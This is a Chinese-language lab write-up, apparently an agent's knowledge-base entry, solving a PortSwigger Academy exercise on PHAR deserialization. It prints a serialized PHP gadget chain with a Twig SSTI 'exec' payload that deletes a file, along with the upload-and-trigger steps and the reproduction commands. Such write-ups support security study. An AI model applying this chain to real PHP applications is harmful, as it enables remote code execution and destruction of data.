---
title: "lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain"
links:
  - target: deserialization-family
    relation: evidences
---

# lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain

> evidences: [[deserialization-family]]

- 题面:Using PHAR deserialization to deploy a custom gadget chain(/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)
- 实例:https://0ac800f503e69a1285b22cfb00500093.web-security-academy.net (`wiener:peter`)
- 判定目标:删除 Carlos 家目录的 `morale.txt`;状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 链

1. 登录后 `/my-account` 有头像上传 `POST /my-account/avatar`(multipart `avatar` + `csrf`);
   取回 `GET /cgi-bin/avatar.php?avatar=<name>`(image/jpeg)。脚本拼 `<name>.jpg` 并校验文件名
   (`./wiener` → 500 `File name is invalid: ./wiener.jpg in /home/carlos/cgi-bin/avatar.php:12`)。
2. 题面提供 polyglot `PortSwigger/serialization-examples:php/phar-jpg-polyglot.jpg`(合法 JPEG + PHAR)。
   `bin_get` 取回并抽出内嵌 PHAR metadata(ascii run):
   ```
   O:14:"CustomTemplate":1:{s:18:"template_file_path";O:4:"Blog":2:{
     s:4:"desc";s:106:"{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}";
     s:4:"user";s:4:"user";}}
   ```
   即已内置目标命令的 Twig SSTI `exec` gadget。
3. `upload <inst>/my-account/avatar --file avatar=/tmp/b10-phar.jpg --field csrf=<csrf> --jar JAR` → 302 `./`(存为 `wiener.jpg`)。
4. 触发 `GET /cgi-bin/avatar.php?avatar=phar://wiener` → `phar://wiener.jpg` 反序列化 → Twig SSTI 执行 `rm /home/carlos/morale.txt`。
   首次触发即删文件(第二次回显 `rm: cannot remove '/home/carlos/morale.txt': No such file or directory`)。

## 复现命令

```
lab_launch launch C4E61B39D288BCA003B86E45DEE0513DB9A657FFE518C38BC4A03A9D5658B220 --widget-source /web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain --jar /tmp/b10-jar3.json
bin_get https://raw.githubusercontent.com/PortSwigger/serialization-examples/master/php/phar-jpg-polyglot.jpg --out /tmp/b10-phar.jpg --min-run 40
upload "<inst>/my-account/avatar" --file avatar=/tmp/b10-phar.jpg --field csrf=<csrf> --jar /tmp/b10-jar3.json
http_dump "<inst>/cgi-bin/avatar.php?avatar=phar://wiener" --jar /tmp/b10-jar3.json
solved_check "<inst>" --jar /tmp/b10-jar3.json
```

新件:`bin_get`(二进制下载 + ascii run 抽取,读 polyglot 内嵌序列化串)、`upload`(multipart 二进制上传)。
